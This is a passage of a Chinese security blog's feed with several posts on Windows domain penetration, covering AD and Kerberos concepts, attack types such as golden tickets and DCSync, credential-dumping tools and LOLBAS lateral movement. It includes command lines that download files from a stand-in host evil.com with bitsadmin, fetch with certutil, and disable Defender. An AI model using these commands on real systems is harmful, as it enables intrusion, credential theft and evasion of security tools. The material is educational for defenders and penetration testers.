    <id>http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-24T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:01.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><span id="more"></span><h1 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h1><h2 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h2><h3 id="用户-1"><a href="#用户-1" class="headerlink" title="用户"></a>用户</h3><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组(Workgroup)是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p><h2 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h2><h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><p>域环境中的用户和本地用户的账户不同，域用户账户保存在活动目录中。在域环境里，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID(Security Identifier)来表明身份，用NTLM哈希或者Kerberos来验证身份。</p><h3 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h3><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾。</p><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)。</p><h1 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h1><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS。</p><h2 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h2><p>NetBIOS(Network Basic Input&#x2F;Output System)是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p><p>基于NetBIOS有NBNS(NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名。</p><p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络。</p><h2 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h2><p>链路本地多播名称解析(Link-Local Multicast Name Resolution,LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。</p><h2 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h2><p>mDNS(multicast DNS)在Windows10中被引入，监听UDP 5353端口，对应的多播地址为224.0.0.251(FF02::FB)。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信。</p><h2 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h2><p>网络代理自动发现协议(Web Proxy Auto-Discovery,WPAD)是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p><h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><p>域指将网络中堕胎计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单员，在域中，至少有一台域空直接，域控制器中保存着整个域的用户账号和安全数据库。</p><h2 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h2><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树(Trees)由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间(namespace)。</p><h3 id="林"><a href="#林" class="headerlink" title="林"></a>林</h3><p>林(Forests)是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p><h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同地数据库。</p><p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p><p>AD数据库有多主机复制模式(Multi-master Replication Model)和单主机复制模式(Sing-master Replication Model)。</p><p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p><p>单主机复制模式是指由一台被称作操作主机(Operations Master)的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p><h2 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h2><p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p><h3 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h3><p>Active Directory的信任方式可以分为以下几种：</p><ul><li>Tree-Root Trust<br>双向具有转移性</li><li>Parent-Child Trust<br>具有转移性，双向行人</li><li>Forest Trust<br>如果两个林创建了信任关系，则林中所有的域都相互信任<br>两个林之间的信任关系无法自动扩展到其他林上</li><li>Realm Trust<br>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li><li>External Trust<br>位于两个林内的域之间可以通过外部信任来创建信任关系</li><li>Shortcut Trust<br>可以缩短验证用户身份的时间</li></ul><h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>组织单位(Organization Unit,OU)是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p><h1 id="Active-Dirctory"><a href="#Active-Dirctory" class="headerlink" title="Active Dirctory"></a>Active Dirctory</h1><p>活动目录(Active Direcory,AD)是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p><h2 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h2><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p><p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p><p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象。</p><p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p><p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控。</p><p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下。</p><p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索。</p><h2 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h2><p>名称空间(namespace)是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p><h2 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h2><p>ADDS内的资源都是以对象(Object)的形式存在的，对象通过属性(Attrbute)来描述其特征。</p><h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Active Directory证书服务(Active Directory Certificate Services,ADCS)是微软用于实现PKI的服务。</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ADCS中的证书是X.509格式的数字签名文档，用于加密、签名或身份验证等。</p><p>证书常用的属性由下述字段组成</p><ul><li>Subject:主题</li><li>Public Key:公钥</li><li>Extended Key Usages(EKUs):扩展密钥，描述证书的对象标识符(Object identifier,OID)</li></ul><p>常用的EKU OID包括：</p><ul><li><p>代码签名<br>OID 1.3.6.1.5.5.7.3.3<br>证书用于签署可执行代码</p></li><li><p>加密文件系统<br>OID 1.3.6.1.4.1.311.10.3.4<br>证书用于加密文件系统</p></li><li><p>安全电子邮件<br>OID 1.3.6.1.5.5.7.3.4<br>证书用于加密电子邮件</p></li><li><p>客户端身份验证<br>OID 1.3.6.1.5.5.7.3.2</p></li><li><p>智能卡登录<br>OID 1.3.6.1.4.1.311.20.2.2</p></li><li><p>服务器认证<br>OID 1.3.6.1.5.5.7.3.1<br>证书用于识别服务器 (例如HTTPS 证书)</p></li></ul><h2 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h2><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p><h2 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h2><p>证书可以通过以下几种方式注册：</p><p>通过 Windows 客户端证书注册协议 (MS-WCCE)<br>通过 ICertPassage 远程协议 (MS-ICPR)<br>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册<br>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册<br>在服务器安装了对应服务时，使用网络设备注册服务</p><h1 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p><p>组策略有以下功能：</p><p>管理注册表<br>设置脚本<br>重定向文件夹<br>管理应用程序<br>指定安全选项</p><h2 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h2><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT。</p><p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p><p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p><p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中。</p><h1 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h1><h2 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符。</p><p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下。</p><h1 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h1><ul><li><p>获取域控权限<br>通过域控相关漏洞<br>抓hash，尤其是域管理员、运维等高权限账号的哈希</p></li><li><p>控制入域机器<br>下发恶意策略控制<br>获取域内用户凭证<br>利用错误的域管理配置<br>域内relay</p></li><li><p>获取服务票据<br>攻击Exchange等服务器</p></li></ul><h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h2 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h2><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p><p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限。</p><h2 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h2><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务。</p><h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 DRSR 的同步机制。</p><p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p><p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash。</p><p>这种方式需要满足以下任一一种权限：</p><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户<br>域控制器的计算机帐户<br>或者拥有特定的几条 DACL:</p><p>DS-Replication-Get-Changes<br>DS-Replication-Get-Changes-All<br>DS-Replication-Get-Changes-In-Filtered-Set<br>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p><p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p><h2 id="DCShadow攻击"><a href="#DCShadow攻击" class="headerlink" title="DCShadow攻击"></a>DCShadow攻击</h2><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出。</p><p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。</p><h2 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h2><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 公开 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解。</p><h3 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h3><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code> 。</p><h2 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h2><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p><p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p><h2 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h2><p>域用户提权 (CVE-2022-26923)<br>KDC bamboozling (CVE-2021-42287)<br>Name impersonation (CVE-2021-42278)<br>ProxyShell (CVE-2021-34473)<br>ProxyLogon (CVE-2021-26855)<br>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)<br>SMBGhost (CVE-2020-0796)<br>Zerologon (CVE-2020-1472)<br>NTLM Relay (CVE-2019-1040)<br>永恒之蓝 (MS17-010)<br>域用户提权 (MS14-068)<br>Gpp漏洞 (MS14-025)<br>SAMR协议漏洞 (MS14-016)</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><ul><li>使用ATA等商业化防护工具</li><li>安装杀毒软件、EDR等工具</li><li>关闭高危服务</li><li>统一配置防火墙策略</li><li>对域控等高危账号使用白名单进行行为管理</li><li>检测高危操作<br>权限提升<br>高危账号密码修改、重置</li><li>行为频率建模<br>对大量尝试登录&#x2F;信息查询进行报警</li><li>及时安装补丁</li><li>对特定攻击行为进行监控<br>通过GPO下发自启动、计划任务</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之权限</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:21.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限，才能从外围进入核心。</p><span id="more"></span><h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAC(User Account Control)是Windows Vista和Windows Server 2008引入的一个安全机制，当一些敏感操作发生时，会跳出提示显示要求系统权限。</p><p>当用户登录Windows时，每个用户都会被授予一个access token，这个token中有security identifier(SID)的信息，决定了用户的权限。</p><h2 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h2><ul><li>以管理员权限启动应用</li><li>修改系统、UAC设置</li><li>修改没有权限的文件或目录（%SystemRoot% &#x2F; %ProgramFiles% 等）</li><li>修改ACL(access control list)</li><li>安装驱动</li><li>增删账户，修改账户类型，激活来宾用户</li></ul><h2 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h2><ul><li>DLL相关</li><li>进程注入</li><li>注册表</li></ul><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>权限提升有多种方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或是其他类似的漏洞，以获得较高权限。</p><p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p><h2 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h2><p>在Windows中用户可以写的敏感位置主要有以下这些：</p><ul><li>用户自身的文件和目录，包括<code>AppData</code> <code>Temp</code></li><li><code>C:\</code> , 默认情况下用户可以写入</li><li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li><li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li></ul><p>具体的ACL信息可用AccessChk，或Powershell的 <code>Get-Acl</code> 命令查看。</p><p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。</p><h2 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h2><p>MOF(Managed Object Format)是Windows系统的一个文件 <code>c:/windows/system32/wbem/mof/nullvert.mof</code><br>叫做“托管对象格式”，其作用是每隔5秒就会去监控进行创建和死亡。</p><p>当拥有文件上传的权限但是没有shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p><p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。</p><h2 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h2><ul><li><p>Windows本地密码散列导出工具<br>mimikatz<br>lsass<br>wce<br>gsecdump<br>copypwd<br>Pwdump<br><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></p></li><li><p>Windows本地密码破解工具<br>L0phtCrack<br>SAMInside<br>Ophcrack<br>彩虹表破解（<a href="https://www.zhihu.com/question/19790488">彩虹表</a>）<br>本机hash+明文抓取<br>win8+win2012明文抓取<br>ntds.dit的导出+QuarkPwDump读取分析<br>vssown.vbs+libesedb+NtdsXtract<br>ntdsdump<br>利用powershell(DSInternals)分析hash<br>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数<br>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>组策略首选漏洞<br>DLL劫持<br>替换系统工具，实现后门<br>关闭defender <code>Set-MpPreference -disablerealtimeMonitoring $true</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限，才能从外围进入核心。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之横向移动</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:10.090Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限后，横向移动以取得更多成果。</p><span id="more"></span><h1 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h1><ul><li>SMB弱密码</li><li>SqlServer弱密码</li></ul><h1 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。</p><p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。</p><h2 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h2><ul><li><p>appsyncvpublishing.exe<br>执行powershell</p></li><li><p>bitsadmin.exe<br>下载文件 <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;remote_path&gt; &lt;local_path&gt;</code><br>下载文件 <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns</code><br>复制文件 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfoler\cmd.exe</code><br>代码执行 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe</code></p></li><li><p>cdb.exe</p></li><li><p>certutil.exe<br>可安装、备份、删除、管理和执行证书<br>证书存储相关功能<br>下载文件 <code>certuil -urlcache -split -f https://addr/example.exe</code><br>注意certutil是有cache的，需要显式删除<br>base64编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></p></li><li><p>cmd.exe</p></li><li><p>cmstp.exe</p></li><li><p>control.exe<br>加载dll</p></li><li><p>csc.exe<br>编译C#载荷</p></li><li><p>cscript.exe<br>执行脚本</p></li><li><p>extexport.exe</p></li><li><p>expand.exe<br>展开一个或多个压缩文件</p></li><li><p>forfiles.exe<br><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></p></li><li><p>mofcomp.exe</p></li><li><p>makecab.exe</p></li><li><p>msbuild.exe<br>构建应用程序</p></li><li><p>mshta.exe<br>HTML应用</p></li><li><p>msxsl.exe<br>处理加载XSL程序</p></li><li><p>netsh.exe</p></li><li><p>installutil.exe<br>安装&#x2F;卸载程序组件</p></li><li><p>IEExec.exe<br>.NET Framework附带程序</p></li><li><p>powershell.exe</p></li><li><p>psexec.exe<br><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">PsExec</a></p></li><li><p>reg.exe<br>注册表控制台</p></li><li><p>regedit.exe<br>注册表修改</p></li><li><p>regsvr32.exe<br>注册动态链接库&#x2F;ActiveX控件</p></li><li><p>rundll32.exe<br>执行DLL文件中的内部函数</p></li><li><p>sc.exe<br>查看服务状态管理</p></li><li><p>schtasks.exe<br>定时计划任务</p></li><li><p>shred<br>重复写入文件，防止文件恢复</p></li><li><p>type.exe<br>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></p></li><li><p>wmic.exe<br>Windows管理工具</p></li><li><p>windbg.exe</p></li><li><p>winrm.exe</p></li><li><p>wscript.exe<br>脚本引擎</p></li><li><p>waitfor.exe<br>用于同步网络中计算机，可以发送或等待系统上的信号。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限后，横向移动以取得更多成果。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="横向移动" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之痕迹清理</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:15.023Z</updated>
    
